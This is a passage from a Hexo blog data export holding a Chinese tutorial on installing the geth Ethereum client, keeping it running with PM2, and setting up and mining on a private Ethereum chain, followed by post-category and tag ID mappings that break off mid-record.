{}\n}\n```\n\n初始化创世纪节点,并设置data目录:\n\n```\ngeth --datadir ./data/00 init genesis.json \n```\n\n启动节点, 加上console 表示启动后,启用命令行:\n\n```\ngeth --datadir ./data/00 --networkid 56 console\n```\n\n至此,私有链已经启动并进入命令行.\n\n![](/images/geth2.png)\n\n现在私有网络就搭建成功,接下来就可以在这个刚搭建的私有网络中执行进行挖矿了,\n首先必须有一个账户,输入下面的命令,新建一个账户:\n\n```\n> personal.newAccount(\"123456\")\n\"0x0d00579784bc64009af229f325c018c2acab9341\"\n```\n\n有了账户,下面就可以开始挖矿,继续在命令行书输出:\n\n```\n> miner.start()\nINFO [03-16|15:54:25] Updated mining threads          threads=0\nINFO [03-16|15:54:25] Transaction pool price threshold updated price=18000000000\nINFO [03-16|15:54:25] Etherbase automatically configured    address=0x0D00579784bC64009af229f325c018C2AcAB9341\n> INFO [03-16|15:54:25] Starting mining operation \nINFO [03-16|15:54:25] Commit new mining work          number=1 txs=0 uncles=0 elapsed=309.196µs\nINFO [03-16|15:54:28] Generating DAG in progress        epoch=0 \n```\n\n挖矿后，会不停刷屏，输入miner.stop()即停止，不用管刷屏导致的命令不全，命令会正常执行.\n\n\n\n\n\n\n\n","slug":"部署以太坊私有链并挖矿","published":1,"updated":"2018-03-16T09:37:24.862Z","layout":"post","photos":[],"link":"","_id":"cjf7piawe002fpkwoz8r35s54","content":"<p>##定义</p>\n<ul>\n<li><p>以太坊是一个区块链应用开发平台，基于以太坊构建的网络和智能合约语言，可以实现各种各样的与现实世界接近的分布式应用（DApp）.</p>\n</li>\n<li><p>智能合约是一段代码和数据的集合，可以部署以太坊网络上运行。如果做比喻的话智能合约更像是JAVA程序，JAVA程序通过JAVA虚拟机（JVM）将代码解释字节进行执行，以太坊的智能合约通过以太坊虚拟机（EVM）解释成字节码进行执行.</p>\n</li>\n<li><p>以太坊虚拟机（EVM）是以太坊中智能合约的运行环境。它不仅被沙箱封装起来，事实上它被完全隔离运行，也就是说运行在EVM内部的代码不能接触到网络、文件系统或者其它进程，甚至智能合约之间也只有有限的调用.</p>\n</li>\n</ul>\n<h2 id=\"1-部署以太坊节点\"><a href=\"#1-部署以太坊节点\" class=\"headerlink\" title=\"1.部署以太坊节点\"></a>1.部署以太坊节点</h2><h3 id=\"1-1-geth\"><a href=\"#1-1-geth\" class=\"headerlink\" title=\"1.1 geth\"></a>1.1 geth</h3><p>geth全称 go-ethereum , 它是一个用Go语言实现运行在以太坊完整节点上的命令行接口，安装并运行了geth，可以成为以太坊正式链的节点并且可以实现挖矿,转账,创建智能合约等.</p>\n<h3 id=\"1-2-geth节点服务器部署\"><a href=\"#1-2-geth节点服务器部署\" class=\"headerlink\" title=\"1.2 geth节点服务器部署\"></a>1.2 geth节点服务器部署</h3><p>安装系统依赖库:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install build-essential git unzip wget ntp</span><br></pre></td></tr></table></figure>\n<p>添加以太坊官方 APT 源，并安装以太坊客户端:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install software-properties-common</span><br><span class=\"line\">sudo add-apt-repository -y ppa:ethereum/ethereum</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install ethereum</span><br></pre></td></tr></table></figure>\n<p>这里使用的是ubuntu系统,如果你使用的是centos,也可以直接下载编译好的二进制文件直接运行或自行下载源码进行编译.</p>\n<blockquote>\n<p>geth官方下载地址 : <a href=\"https://geth.ethereum.org/downloads\" target=\"_blank\" rel=\"noopener\">https://geth.ethereum.org/downloads</a> </p>\n<p> <a href=\"https://gethstore.blob.core.windows.net/builds/geth-linux-amd64-1.8.2-b8b9f7f4.tar.gz\" target=\"_blank\" rel=\"noopener\">https://gethstore.blob.core.windows.net/builds/geth-linux-amd64-1.8.2-b8b9f7f4.tar.gz</a></p>\n<p>geth github : <a href=\"https://github.com/ethereum/go-ethereum\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/go-ethereum</a></p>\n</blockquote>\n<p>运行:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ geth console</span><br></pre></td></tr></table></figure>\n<p>或者 geth account new 获取账号:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-0-5-ubuntu:~# geth account new</span><br><span class=\"line\">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class=\"line\">Passphrase: </span><br><span class=\"line\">Repeat passphrase: </span><br><span class=\"line\">Address: &#123;747998fa9d6253f36de8b8b32c29fec58ec82879&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-3-后台进程管理\"><a href=\"#1-3-后台进程管理\" class=\"headerlink\" title=\"1.3 后台进程管理\"></a>1.3 后台进程管理</h3><p>如果需要长期运行以太坊全数据节点或同步区块,就要保证 geth客户端一直在后台运行,所以需要一个后台进程管理工具,这里使用以太坊开发者推荐的PM2配置geth后台进程管理;崩溃自启和开机自启.</p>\n<p>PM2是基于Nodejs的,我们首先来安装Nodejs,在使用npm安装pm2 :</p>\n<p>sudo apt-get install npm<br>sudo npm install n -g<br>sudo n 8.9.4<br>node -v<br>sudo npm install pm2</p>\n<p>上段代码里,n是nodejs的包管理器,可以更换不同的nodejs版本,这里使用的是8.9.4的长期支持版.</p>\n<p>正确安装pm2后,创建pm2配置文件,配置文件以json的形式加载:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim geth.json</span><br><span class=\"line\"></span><br><span class=\"line\">[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;name&quot;              : &quot;geth&quot;,        // 应用名称</span><br><span class=\"line\">    &quot;cwd&quot;               : &quot;/usr/bin/&quot;,   // 当前工作路径</span><br><span class=\"line\">    &quot;script&quot;            : &quot;geth&quot;,       // 实际启动脚本</span><br><span class=\"line\">    &quot;args&quot;              : &quot;--rpc --fast --maxpeers 100 --cache 512 --networkid 56&quot;,</span><br><span class=\"line\">    &quot;log_date_format&quot;   : &quot;YYYY-MM-DD HH:mm Z&quot;,</span><br><span class=\"line\">    &quot;merge_logs&quot;        : false,</span><br><span class=\"line\">    &quot;watch&quot;             : false,</span><br><span class=\"line\">    &quot;max_restarts&quot;      : 10,</span><br><span class=\"line\">    &quot;exec_interpreter&quot;  : &quot;none&quot;,</span><br><span class=\"line\">    &quot;exec_mode&quot;         : &quot;fork_mode&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">pm2 start geth.json              //pm2后台启动geth</span><br></pre></td></tr></table></figure>\n<p>到这里已经后台启动了geth客户端,使用pm2 logs查看实时运行日志.</p>\n<p><img src=\"/images/geth.png\" alt=\"\"></p>\n<h2 id=\"2-搭建私有连并挖矿\"><a href=\"#2-搭建私有连并挖矿\" class=\"headerlink\" title=\"2.搭建私有连并挖矿\"></a>2.搭建私有连并挖矿</h2><p>做一些测试工作的时候, 为了方便控制以及更快的进入真正的测试工作,需要搭建一个私有的以太坊网络.<br>而以太坊节点之间能够互相链接需要满足这些条件:<br>相同的协议版本<br>相同的networkid,所以搭建私有网络最方便的方法就是通过geth命令中的 –networkid 选项,设置一个与主网不同的networkid(主网的networkid为1),这也是官方推荐的方法.<br>下面开始建立私有以太坊网络 , 设置创世区块文件,也是一个json的文件:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim genesis.json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;coinbase&quot;   : &quot;0x2fa91e94990a5e46589e07725991b6fa013e4b60&quot;,</span><br><span class=\"line\">  &quot;difficulty&quot; : &quot;200000000&quot;,</span><br><span class=\"line\">  &quot;extraData&quot;  : &quot;&quot;,</span><br><span class=\"line\">  &quot;gasLimit&quot;   : &quot;0x2fefd8&quot;,</span><br><span class=\"line\">  &quot;nonce&quot;      : &quot;0xdeadbeefdeadbeef&quot;,</span><br><span class=\"line\">    &quot;config&quot;:&#123;</span><br><span class=\"line\">      &quot;chainId&quot;:56,</span><br><span class=\"line\">      &quot;homesteadBlock&quot;:0,</span><br><span class=\"line\">      &quot;eip155Block&quot;:0,</span><br><span class=\"line\">      &quot;eip158Block&quot;:0</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">  &quot;mixhash&quot;    : &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class=\"line\">  &quot;parentHash&quot; : &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class=\"line\">  &quot;timestamp&quot;  : &quot;0x00&quot;,</span><br><span class=\"line\">  &quot;alloc&quot;      : &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>初始化创世纪节点,并设置data目录:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">geth --datadir ./data/00 init genesis.json</span><br></pre></td></tr></table></figure>\n<p>启动节点, 加上console 表示启动后,启用命令行:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">geth --datadir ./data/00 --networkid 56 console</span><br></pre></td></tr></table></figure>\n<p>至此,私有链已经启动并进入命令行.</p>\n<p><img src=\"/images/geth2.png\" alt=\"\"></p>\n<p>现在私有网络就搭建成功,接下来就可以在这个刚搭建的私有网络中执行进行挖矿了,<br>首先必须有一个账户,输入下面的命令,新建一个账户:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; personal.newAccount(&quot;123456&quot;)</span><br><span class=\"line\">&quot;0x0d00579784bc64009af229f325c018c2acab9341&quot;</span><br></pre></td></tr></table></figure>\n<p>有了账户,下面就可以开始挖矿,继续在命令行书输出:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; miner.start()</span><br><span class=\"line\">INFO [03-16|15:54:25] Updated mining threads          threads=0</span><br><span class=\"line\">INFO [03-16|15:54:25] Transaction pool price threshold updated price=18000000000</span><br><span class=\"line\">INFO [03-16|15:54:25] Etherbase automatically configured    address=0x0D00579784bC64009af229f325c018C2AcAB9341</span><br><span class=\"line\">&gt; INFO [03-16|15:54:25] Starting mining operation </span><br><span class=\"line\">INFO [03-16|15:54:25] Commit new mining work          number=1 txs=0 uncles=0 elapsed=309.196µs</span><br><span class=\"line\">INFO [03-16|15:54:28] Generating DAG in progress        epoch=0</span><br></pre></td></tr></table></figure>\n<p>挖矿后，会不停刷屏，输入miner.stop()即停止，不用管刷屏导致的命令不全，命令会正常执行.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>##定义</p>\n<ul>\n<li><p>以太坊是一个区块链应用开发平台，基于以太坊构建的网络和智能合约语言，可以实现各种各样的与现实世界接近的分布式应用（DApp）.</p>\n</li>\n<li><p>智能合约是一段代码和数据的集合，可以部署以太坊网络上运行。如果做比喻的话智能合约更像是JAVA程序，JAVA程序通过JAVA虚拟机（JVM）将代码解释字节进行执行，以太坊的智能合约通过以太坊虚拟机（EVM）解释成字节码进行执行.</p>\n</li>\n<li><p>以太坊虚拟机（EVM）是以太坊中智能合约的运行环境。它不仅被沙箱封装起来，事实上它被完全隔离运行，也就是说运行在EVM内部的代码不能接触到网络、文件系统或者其它进程，甚至智能合约之间也只有有限的调用.</p>\n</li>\n</ul>\n<h2 id=\"1-部署以太坊节点\"><a href=\"#1-部署以太坊节点\" class=\"headerlink\" title=\"1.部署以太坊节点\"></a>1.部署以太坊节点</h2><h3 id=\"1-1-geth\"><a href=\"#1-1-geth\" class=\"headerlink\" title=\"1.1 geth\"></a>1.1 geth</h3><p>geth全称 go-ethereum , 它是一个用Go语言实现运行在以太坊完整节点上的命令行接口，安装并运行了geth，可以成为以太坊正式链的节点并且可以实现挖矿,转账,创建智能合约等.</p>\n<h3 id=\"1-2-geth节点服务器部署\"><a href=\"#1-2-geth节点服务器部署\" class=\"headerlink\" title=\"1.2 geth节点服务器部署\"></a>1.2 geth节点服务器部署</h3><p>安装系统依赖库:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install build-essential git unzip wget ntp</span><br></pre></td></tr></table></figure>\n<p>添加以太坊官方 APT 源，并安装以太坊客户端:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install software-properties-common</span><br><span class=\"line\">sudo add-apt-repository -y ppa:ethereum/ethereum</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install ethereum</span><br></pre></td></tr></table></figure>\n<p>这里使用的是ubuntu系统,如果你使用的是centos,也可以直接下载编译好的二进制文件直接运行或自行下载源码进行编译.</p>\n<blockquote>\n<p>geth官方下载地址 : <a href=\"https://geth.ethereum.org/downloads\" target=\"_blank\" rel=\"noopener\">https://geth.ethereum.org/downloads</a> </p>\n<p> <a href=\"https://gethstore.blob.core.windows.net/builds/geth-linux-amd64-1.8.2-b8b9f7f4.tar.gz\" target=\"_blank\" rel=\"noopener\">https://gethstore.blob.core.windows.net/builds/geth-linux-amd64-1.8.2-b8b9f7f4.tar.gz</a></p>\n<p>geth github : <a href=\"https://github.com/ethereum/go-ethereum\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/go-ethereum</a></p>\n</blockquote>\n<p>运行:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ geth console</span><br></pre></td></tr></table></figure>\n<p>或者 geth account new 获取账号:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-0-5-ubuntu:~# geth account new</span><br><span class=\"line\">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class=\"line\">Passphrase: </span><br><span class=\"line\">Repeat passphrase: </span><br><span class=\"line\">Address: &#123;747998fa9d6253f36de8b8b32c29fec58ec82879&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-3-后台进程管理\"><a href=\"#1-3-后台进程管理\" class=\"headerlink\" title=\"1.3 后台进程管理\"></a>1.3 后台进程管理</h3><p>如果需要长期运行以太坊全数据节点或同步区块,就要保证 geth客户端一直在后台运行,所以需要一个后台进程管理工具,这里使用以太坊开发者推荐的PM2配置geth后台进程管理;崩溃自启和开机自启.</p>\n<p>PM2是基于Nodejs的,我们首先来安装Nodejs,在使用npm安装pm2 :</p>\n<p>sudo apt-get install npm<br>sudo npm install n -g<br>sudo n 8.9.4<br>node -v<br>sudo npm install pm2</p>\n<p>上段代码里,n是nodejs的包管理器,可以更换不同的nodejs版本,这里使用的是8.9.4的长期支持版.</p>\n<p>正确安装pm2后,创建pm2配置文件,配置文件以json的形式加载:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim geth.json</span><br><span class=\"line\"></span><br><span class=\"line\">[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;name&quot;              : &quot;geth&quot;,        // 应用名称</span><br><span class=\"line\">    &quot;cwd&quot;               : &quot;/usr/bin/&quot;,   // 当前工作路径</span><br><span class=\"line\">    &quot;script&quot;            : &quot;geth&quot;,       // 实际启动脚本</span><br><span class=\"line\">    &quot;args&quot;              : &quot;--rpc --fast --maxpeers 100 --cache 512 --networkid 56&quot;,</span><br><span class=\"line\">    &quot;log_date_format&quot;   : &quot;YYYY-MM-DD HH:mm Z&quot;,</span><br><span class=\"line\">    &quot;merge_logs&quot;        : false,</span><br><span class=\"line\">    &quot;watch&quot;             : false,</span><br><span class=\"line\">    &quot;max_restarts&quot;      : 10,</span><br><span class=\"line\">    &quot;exec_interpreter&quot;  : &quot;none&quot;,</span><br><span class=\"line\">    &quot;exec_mode&quot;         : &quot;fork_mode&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">pm2 start geth.json              //pm2后台启动geth</span><br></pre></td></tr></table></figure>\n<p>到这里已经后台启动了geth客户端,使用pm2 logs查看实时运行日志.</p>\n<p><img src=\"/images/geth.png\" alt=\"\"></p>\n<h2 id=\"2-搭建私有连并挖矿\"><a href=\"#2-搭建私有连并挖矿\" class=\"headerlink\" title=\"2.搭建私有连并挖矿\"></a>2.搭建私有连并挖矿</h2><p>做一些测试工作的时候, 为了方便控制以及更快的进入真正的测试工作,需要搭建一个私有的以太坊网络.<br>而以太坊节点之间能够互相链接需要满足这些条件:<br>相同的协议版本<br>相同的networkid,所以搭建私有网络最方便的方法就是通过geth命令中的 –networkid 选项,设置一个与主网不同的networkid(主网的networkid为1),这也是官方推荐的方法.<br>下面开始建立私有以太坊网络 , 设置创世区块文件,也是一个json的文件:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim genesis.json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;coinbase&quot;   : &quot;0x2fa91e94990a5e46589e07725991b6fa013e4b60&quot;,</span><br><span class=\"line\">  &quot;difficulty&quot; : &quot;200000000&quot;,</span><br><span class=\"line\">  &quot;extraData&quot;  : &quot;&quot;,</span><br><span class=\"line\">  &quot;gasLimit&quot;   : &quot;0x2fefd8&quot;,</span><br><span class=\"line\">  &quot;nonce&quot;      : &quot;0xdeadbeefdeadbeef&quot;,</span><br><span class=\"line\">    &quot;config&quot;:&#123;</span><br><span class=\"line\">      &quot;chainId&quot;:56,</span><br><span class=\"line\">      &quot;homesteadBlock&quot;:0,</span><br><span class=\"line\">      &quot;eip155Block&quot;:0,</span><br><span class=\"line\">      &quot;eip158Block&quot;:0</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">  &quot;mixhash&quot;    : &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class=\"line\">  &quot;parentHash&quot; : &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class=\"line\">  &quot;timestamp&quot;  : &quot;0x00&quot;,</span><br><span class=\"line\">  &quot;alloc&quot;      : &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>初始化创世纪节点,并设置data目录:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">geth --datadir ./data/00 init genesis.json</span><br></pre></td></tr></table></figure>\n<p>启动节点, 加上console 表示启动后,启用命令行:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">geth --datadir ./data/00 --networkid 56 console</span><br></pre></td></tr></table></figure>\n<p>至此,私有链已经启动并进入命令行.</p>\n<p><img src=\"/images/geth2.png\" alt=\"\"></p>\n<p>现在私有网络就搭建成功,接下来就可以在这个刚搭建的私有网络中执行进行挖矿了,<br>首先必须有一个账户,输入下面的命令,新建一个账户:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; personal.newAccount(&quot;123456&quot;)</span><br><span class=\"line\">&quot;0x0d00579784bc64009af229f325c018c2acab9341&quot;</span><br></pre></td></tr></table></figure>\n<p>有了账户,下面就可以开始挖矿,继续在命令行书输出:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; miner.start()</span><br><span class=\"line\">INFO [03-16|15:54:25] Updated mining threads          threads=0</span><br><span class=\"line\">INFO [03-16|15:54:25] Transaction pool price threshold updated price=18000000000</span><br><span class=\"line\">INFO [03-16|15:54:25] Etherbase automatically configured    address=0x0D00579784bC64009af229f325c018C2AcAB9341</span><br><span class=\"line\">&gt; INFO [03-16|15:54:25] Starting mining operation </span><br><span class=\"line\">INFO [03-16|15:54:25] Commit new mining work          number=1 txs=0 uncles=0 elapsed=309.196µs</span><br><span class=\"line\">INFO [03-16|15:54:28] Generating DAG in progress        epoch=0</span><br></pre></td></tr></table></figure>\n<p>挖矿后，会不停刷屏，输入miner.stop()即停止，不用管刷屏导致的命令不全，命令会正常执行.</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cjf7piaun0000pkwoiwgn7hbo","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piav5000bpkwoypso6fes"},{"post_id":"cjf7piav20009pkwo5ropiacu","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piava000hpkwo5cxh4tjz"},{"post_id":"cjf7piaus0001pkwoe1b16kmt","category_id":"cjf7piav10007pkwofdmqydpz","_id":"cjf7piavc000mpkwo4n2rfe8s"},{"post_id":"cjf7piav4000apkworz2aw7jj","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piave000opkwo7m8xvtgm"},{"post_id":"cjf7piav6000epkworyqsrfdo","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piavh000spkwojxqb6cnt"},{"post_id":"cjf7piaux0004pkwojm85qmx8","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piavj000upkwolpeu08tz"},{"post_id":"cjf7piav9000gpkwoxao9iu31","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piavl000wpkwostdahxkv"},{"post_id":"cjf7piavc000lpkwo7ryicz85","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piavn000zpkwo571pr45n"},{"post_id":"cjf7piauz0005pkwo5ocr6mom","category_id":"cjf7piavb000jpkwouxp5fb3d","_id":"cjf7piavo0011pkwo7v0pid0r"},{"post_id":"cjf7piavd000npkwo3peccxbr","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piavq0014pkwo0orilyfa"},{"post_id":"cjf7piavf000rpkwohf41z4og","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piavs0017pkwosha9y5qm"},{"post_id":"cjf7piav00006pkwo172gvylx","category_id":"cjf7piavb000jpkwouxp5fb3d","_id":"cjf7piavu001bpkwo0tipssuc"},{"post_id":"cjf7piavj000tpkwof18s3uag","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piavw001epkwombgmjwd4"},{"post_id":"cjf7piavk000vpkwo7l7huqtj","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piavy001ipkwos7hbfees"},{"post_id":"cjf7piavm000ypkwom8df87ov","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piaw0001lpkwoy2vnd3vw"},{"post_id":"cjf7piavn0010pkwogiujtx35","category_id":"cjf7piavb000jpkwouxp5fb3d","_id":"cjf7piaw2001ppkwowr9gdh3m"},{"post_id":"cjf7piavp0013pkwoy0wj1l2h","category_id":"cjf7piav10007pkwofdmqydpz","_id":"cjf7piaw4001spkwoz6xvw7py"},{"post_id":"cjf7piavr0016pkwotjxlvs56","category_id":"cjf7piav10007pkwofdmqydpz","_id":"cjf7piaw5001vpkwohplsyw0p"},{"post_id":"cjf7piavt001apkwo7vmq7dpu","category_id":"cjf7piav10007pkwofdmqydpz","_id":"cjf7piaw7001zpkwolaa7f4ek"},{"post_id":"cjf7piavv001dpkwof5qoe26u","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piaw90022pkwoc8aguvsz"},{"post_id":"cjf7piavx001hpkwotkedf3bu","category_id":"cjf7piav5000cpkwos2deesal","_id":"cjf7piawa0026pkwos6hnzifd"},{"post_id":"cjf7piavz001kpkwom15ghi37","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawc0029pkwot201v0x8"},{"post_id":"cjf7piaw1001opkwop3p3p6po","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawd002dpkwom17slx88"},{"post_id":"cjf7piaw3001rpkwok0927on5","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawf002gpkwow9iqa33y"},{"post_id":"cjf7piaw5001upkwoowhrv02x","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawg002jpkwos4fgjgoj"},{"post_id":"cjf7piaw7001ypkwomgwbm7wf","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawh002lpkwo7hqq9g2s"},{"post_id":"cjf7piaw80021pkwo2nstrogm","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawi002opkwo57spbx9u"},{"post_id":"cjf7piawa0025pkwog3vvefje","category_id":"cjf7piavb000jpkwouxp5fb3d","_id":"cjf7piawi002qpkwolya82cq8"},{"post_id":"cjf7piawb0028pkwoac2uzepf","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawj002tpkwooieh4xoy"},{"post_id":"cjf7piawd002cpkwovy527fv4","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawj002vpkwocveo713q"},{"post_id":"cjf7piawe002fpkwoz8r35s54","category_id":"cjf7piauv0002pkwo3fd7avsa","_id":"cjf7piawk002ypkworf0ydiya"}],"PostTag":[{"post_id":"cjf7piaun0000pkwoiwgn7hbo","tag_id":"cjf7piaux0003pkwo3x3kpn4v","_id":"cjf7piav8000fpkwo1isf26c3"},{"post_id":"cjf7piaun0000pkwoiwgn7hbo","tag_id":"cjf7piav20008pkwo4gkzf61s","_id":"cjf7piavb000ipkwomkd6swwu"},{"post_id":"cjf7piaus0001pkwoe1b16kmt","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piavq0015pkworgz3g4xq"},{"post_id":"cjf7piaus0001pkwoe1b16kmt","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piavs0018pkwoxe2o7kan"},{"post_id":"cjf7piaus0001pkwo